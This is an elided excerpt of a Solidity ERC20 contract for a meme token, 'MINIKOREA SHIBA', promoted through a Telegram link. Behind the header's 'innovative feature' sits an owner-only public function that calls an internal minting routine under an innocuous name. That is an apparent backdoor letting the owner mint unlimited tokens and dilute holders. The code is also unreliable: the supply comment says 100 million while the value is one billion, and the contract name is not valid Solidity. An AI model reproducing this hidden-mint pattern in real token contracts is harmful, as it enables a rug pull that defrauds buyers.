...
//
// $MINIKOREASHIBA proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/MiniKoreaShiba
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function minikoreashiba(uint256 amount) public onlyOwner {
    _minikoreashiba(msg.sender, amount);
    }
    ...
    function _minikoreashiba(address account, uint256 amount) internal virtual {
...
contract $MINIKOREASHIBA is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("MINIKOREA SHIBA", "MKS") {
        _minikoreashiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}